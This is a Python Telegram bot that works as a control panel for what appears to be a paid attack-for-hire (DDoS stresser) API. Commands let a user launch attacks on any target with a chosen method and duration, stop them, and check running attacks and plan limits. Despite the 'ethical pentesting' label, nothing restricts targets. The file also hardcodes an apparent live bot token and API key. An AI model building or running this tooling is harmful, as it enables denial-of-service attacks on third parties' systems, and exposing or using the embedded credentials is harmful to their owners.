import logging
import requests
import json
from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# --- Health / port binder for Render (No Changes) ---
class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return

def _start_health_server():
    port = int(os.environ.get("PORT", "10000"))
    server_address = ("0.0.0.0", port)
    httpd = HTTPServer(server_address, _HealthHandler)
    httpd.serve_forever()

_health_thread = threading.Thread(target=_start_health_server, daemon=True)
_health_thread.start()


# --- CONFIGURATION ---
BOT_TOKEN = "7814912313:AAHyhW2b17XHgfcyw-26wQSKHZSpCpM9uTs"
USER_API_KEY = "38698f04-75e1-4bb6-904e-17850e4ca52d"
API_BASE_URL = "https://vire.cc/api/v1"

# --- LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- 🛠️ MODIFIED: API UTILITY FUNCTION (NOW SUPPORTS POST) ---

def call_api(path: str, data: dict = None, method: str = 'GET') -> dict:
    """
    Handles API calls. Supports both GET (params in URL) and POST (data in JSON body).
    Authentication key is always added.
    """
    if USER_API_KEY == "YOUR_API_KEY_HERE":
        return {"success": False, "error": "Configuration Error: Please set USER_API_KEY."}

    full_url = f"{API_BASE_URL}/{path}"
    if data is None:
        data = {}

    # Always inject the API key into the data payload
    data['user'] = USER_API_KEY

    try:
        if method.upper() == 'GET':
            # For GET, data is sent as URL query parameters
            response = requests.get(full_url, params=data, timeout=15)
        elif method.upper() == 'POST':
            # For POST, data is sent as a JSON body
            response = requests.post(full_url, json=data, timeout=15)
        else:
            return {"success": False, "error": f"Unsupported HTTP method: {method}"}

        response.raise_for_status()
        
        response_data = response.json()
        
        if response_data.get('success') is False:
            error_message = response_data.get('error', 'Unknown API Error')
            return {"success": False, "error": f"API Error: {error_message}"}
            
        return {"success": True, "data": response_data.get('data', response_data)}
        
    except requests.exceptions.HTTPError as e:
        error_msg = f"{e.response.status_code} Client Error: {e.response.reason}"
        try:
            error_details = e.response.json().get('error', '')
            if error_details:
                error_msg += f" - {error_details}"
        except json.JSONDecodeError:
            pass # No JSON in error response
        return {"success": False, "error": error_msg}
    except requests.exceptions.RequestException as e:
        logger.error(f"API Request failed for {full_url}: {e}")
        return {"success": False, "error": "Connection Error: Could not reach the API."}
    except Exception as e:
        return {"success": False, "error": f"An unexpected error occurred: {e}"}

# --- INTERACTIVITY COMPONENTS ---

MAIN_MENU_KEYBOARD = [
    ["🚀 Launch Attack", "📊 Status Check"],
    ["📚 Methods", "👤 User Info", "📈 Server Stats"]
]
MAIN_MENU_MARKUP = ReplyKeyboardMarkup(MAIN_MENU_KEYBOARD, resize_keyboard=True)

def get_status_inline_markup():
    keyboard = [[
        InlineKeyboardButton("Refresh Status 🔄", callback_data='status_all'),
        InlineKeyboardButton("Stop ALL Attacks 🛑", callback_data='stop_all')
    ]]
    return InlineKeyboardMarkup(keyboard)

# --- TELEGRAM HANDLERS (COMMANDS) ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "💻 **Ethical Pentesting Simulation Bot**\n\n"
        "Welcome! Use the menu buttons below or type commands to interact."
    )
    await update.message.reply_text(message, parse_mode='Markdown', reply_markup=MAIN_MENU_MARKUP)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "**Primary Commands:**\n"
        "`/launch <target> <time> <method>`\n"
        "`/stop <attack_id|all>`\n"
        "`/status <attack_id|all>`\n\n"
        "**Info Commands (or use buttons):**\n"
        "`/methods`, `/user`, `/stats`"
    )
    await update.message.reply_text(message, parse_mode='Markdown')

async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) != 3:
        await update.message.reply_text(
            "🛑 **Invalid usage.**\nFormat: `/launch <target> <time> <method>`"
        )
        return

    target, time_str, method = context.args
    try:
        time_int = int(time_str)
    except ValueError:
        await update.message.reply_text("🛑 **Invalid Time.** Must be a whole number.")
        return

    payload = {"target": target, "time": time_int, "method": method}
    await update.message.reply_text(f"🚀 Attempting to launch **{method}** attack on `{target}`...", parse_mode='Markdown')
    
    # 🛠️ FIXED: Use POST method for launching attacks
    response = call_api("start", data=payload, method='POST')

    if response["success"]:
        message = response['data'].get('message', 'Attack launched successfully!')
        await update.message.reply_text(f"✅ **Success!**\n\n{message}", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Launch Failed.**\n\n{response['error']}", parse_mode='Markdown')

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    send_to = update.message or update.callback_query
    
    if context.args:
        attack_id = context.args[0]
    elif update.callback_query and update.callback_query.data == 'stop_all':
        attack_id = 'all'
        await update.callback_query.answer("Sending stop all command...")
    else:
        await send_to.reply_text("🛑 **Invalid usage.**\nUse: `/stop <id>` or `/stop all`")
        return
    
    payload = {}
    if attack_id.lower() != 'all':
        payload['attack_id'] = attack_id
    
    await send_to.reply_text(f"🛑 Attempting to stop attack(s): `{attack_id}`...", parse_mode='Markdown')
    
    # Stop is likely a POST action as well for safety
    response = call_api("stop", data=payload, method='POST')

    if response["success"]:
        message = response['data'].get('message', 'Stop command sent successfully.')
        await send_to.reply_text(f"✅ **Stop Success!**\n\n{message}", parse_mode='Markdown')
    else:
        await send_to.reply_text(f"❌ **Stop Failed.**\n\n{response['error']}", parse_mode='Markdown')

# --- 🛠️ FIXED: STATUS COMMAND WITH CORRECT PARSING ---
async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    send_to = update.message or update.callback_query
    
    if update.callback_query:
        await update.callback_query.answer("Refreshing status...")

    await send_to.reply_text("🔍 Checking status...", parse_mode='Markdown')
    
    response = call_api("status", method='GET') # Status is a GET request

    if response["success"]:
        data = response["data"]
        summary = data.get('attack_summary', {})
        running_attacks = data.get('running_attacks', [])

        info_text = (
            f"📊 **Attack Status Summary**\n"
            f"**Total Running:** `{summary.get('total_running', 'N/A')}`\n"
            f"**Available Slots:** `{summary.get('available_slots', 'N/A')}`\n\n"
            "------------------------------------\n"
        )

        if not running_attacks:
            info_text += "✅ No active attacks found."
        else:
            info_text += "🔥 **Active Attacks:**\n\n"
            for attack in running_attacks:
                info_text += (
                    f"**ID:** `{attack.get('id', 'N/A')}`\n"
                    f"**Target:** `{attack.get('target', 'N/A')}`\n"
                    f"**Method:** `{attack.get('method', 'N/A')}`\n"
                    f"**Time Left:** `{attack.get('time_remaining', 'N/A')}s`\n"
                    "------------------------------------\n"
                )
        await send_to.reply_text(info_text, parse_mode='Markdown', reply_markup=get_status_inline_markup())
    else:
        await send_to.reply_text(f"❌ **Status Check Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def list_methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🔍 Fetching available methods...")
    response = call_api("methods", method='GET')
    if response["success"]:
        methods = response["data"].get('methods', [])
        if methods:
            info_text = "📚 **Available Attack Methods**\n\n"
            for method in methods:
                info_text += (
                    f"**`{method.get('name', 'N/A')}`** ({method.get('category', 'N/A')})\n"
                    f"  - {method.get('description', 'No description')}\n"
                )
            await update.message.reply_text(info_text, parse_mode='Markdown')
        else:
            await update.message.reply_text("No methods were returned by the API.")
    else:
        await update.message.reply_text(f"❌ **Methods List Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🔍 Fetching user information...")
    response = call_api("user", method='GET')
    if response["success"]:
        user_info = response["data"].get('user_info', {})
        plan_features = response["data"].get('plan_features', {})
        info_text = (
            "👤 **User Account Details**\n\n"
            f"**Username:** `{user_info.get('username', 'N/A')}`\n"
            f"**Plan:** `{user_info.get('plan', 'N/A')}`\n"
            f"**Expires:** `{user_info.get('plan_expires', 'N/A')}`\n"
            f"**Max Concurrent:** `{plan_features.get('concurrent_attacks', 'N/A')}`\n"
            f"**Max Time:** `{plan_features.get('max_attack_time', 'N/A')}s`\n"
        )
        await update.message.reply_text(info_text, parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **User Info Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🔍 Fetching server statistics...")
    response = call_api("stats", method='GET')
    if response["success"]:
        data = response["data"]
        server_info = data.get('server_info', {})
        user_stats = data.get('user_statistics', {})
        attack_stats = data.get('attack_statistics', {})
        info_text = (
            "📈 **Server Statistics**\n\n"
            f"**Server Status:** `{server_info.get('server_status', 'N/A')}`\n"
            f"**Total Running Attacks:** `{attack_stats.get('total_running', 'N/A')}`\n"
            f"**Total Users:** `{user_stats.get('total_users', 'N/A')}`\n"
            f"**Active Users:** `{user_stats.get('active_users', 'N/A')}`"
        )
        await update.message.reply_text(info_text, parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Stats Failed.**\n\n{response['error']}", parse_mode='Markdown')

# --- HANDLERS FOR BUTTONS ---

async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query_data = update.callback_query.data
    if query_data == 'status_all':
        await get_status(update, context)
    elif query_data == 'stop_all':
        await stop_attack(update, context)

async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = update.message.text
    if text == "📚 Methods": await list_methods(update, context)
    elif text == "👤 User Info": await get_user_info(update, context)
    elif text == "📈 Server Stats": await get_server_stats(update, context)
    elif text == "📊 Status Check": await get_status(update, context)
    elif text == "🚀 Launch Attack":
        await update.message.reply_text("To launch, type the command:\n`/launch <target> <time> <method>`", parse_mode='Markdown')

async def set_bot_commands(application: Application):
    commands = [
        BotCommand("start", "Welcome and Main Menu"),
        BotCommand("help", "Show command guide"),
        BotCommand("launch", "Start a stress test attack"),
        BotCommand("stop", "Stop an attack"),
        BotCommand("status", "Check attack status"),
    ]
    await application.bot.set_my_commands(commands)

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).post_init(set_bot_commands).build()
    
    application.add_handler(CommandHandler(["start", "help"], start_command))
    application.add_handler(CommandHandler("launch", launch_attack))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("status", get_status))
    application.add_handler(CommandHandler("methods", list_methods))
    application.add_handler(CommandHandler("user", get_user_info))
    application.add_handler(CommandHandler("stats", get_server_stats))
    
    application.add_handler(CallbackQueryHandler(handle_callback_query))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu_buttons))
    
    logger.info("Bot started successfully...")
    application.run_polling()

if __name__ == '__main__':
    main()
